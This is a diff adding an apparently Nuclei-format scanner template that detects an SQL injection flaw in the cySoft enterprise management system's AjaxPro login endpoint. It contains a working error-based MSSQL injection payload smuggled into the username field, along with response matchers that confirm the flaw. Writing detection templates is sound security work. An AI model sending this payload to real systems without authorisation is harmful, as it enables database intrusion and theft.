@@ -1,0 +1,36 @@
+id: cysoft-ajaxpro-sqli
+info:
+  name: 超易企业管理系统 cySoft.Index,cySoft.ashx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    超易企业管理系统 cySoft.Index,cySoft.ashx SQL注入漏洞, detected using specific payloads and response matching.
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+http:
+  - raw:
+      - |
+        POST /ajaxpro/cySoft.Index,cySoft.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/plain; charset=UTF-8
+        X-AjaxPro-Method: Login
+
+        {"strUser":"admin' AND 4026 IN (SELECT (sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))))--","strPwd":""}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "0x{{t2}}"
+          - "转换成数据类型 int 时失败"
+          - "在将 nvarchar 值"
+        part: body
+      - type: word
+        words:
+          - "<"
+        negative: true
+        part: body
